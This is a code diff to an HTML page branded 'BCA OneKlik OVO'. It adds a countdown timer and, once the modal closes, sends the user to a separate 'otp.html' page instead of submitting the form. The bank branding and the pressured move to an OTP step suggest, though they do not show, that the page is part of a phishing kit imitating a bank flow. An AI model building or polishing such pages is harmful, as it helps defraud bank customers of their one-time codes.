@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BCA OneKlik OVO</title>
     <style>
+        /* CSS Styles */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -157,7 +158,7 @@
             <div class="modal-message" id="modal-message" style="display: none;">
                 <p>Silakan lanjutkan proses registrasi di BCA Mobile pada menu m-Admin - Atur OneKlik</p>
                 <p>Berlaku hingga <span id="validity-date">25/06 20:40:58 WIB</span></p>
-                <button id="modal-ok-button" onclick="closeModal()">OK</button>
+                <button id="modal-ok-button">OK</button>
             </div>
         </div>
     </div>
@@ -202,6 +203,7 @@
             setTimeout(function() {
                 loadingGif.style.display = 'none';
                 modalMessage.style.display = 'block';
+                startCountdown(60); // Set countdown timer to 60 seconds
             }, 3000);
         });
 
@@ -211,7 +213,29 @@
 
         function closeModal() {
             document.getElementById('myModal').style.display = 'none';
-            document.getElementById('oneklik-form').submit(); // Melanjutkan form submit setelah modal ditutup
+            window.location.href = 'otp.html'; // Redirect to otp.html
+        }
+
+        document.getElementById('modal-ok-button').addEventListener('click', function() {
+            closeModal();
+        });
+
+        function startCountdown(seconds) {
+            const validityDate = document.getElementById('validity-date');
+            let timeLeft = seconds;
+
+            const countdown = setInterval(function() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                validityDate.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds} WIB`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    closeModal();
+                }
+
+                timeLeft--;
+            }, 1000);
         }
     </script>
 </body>
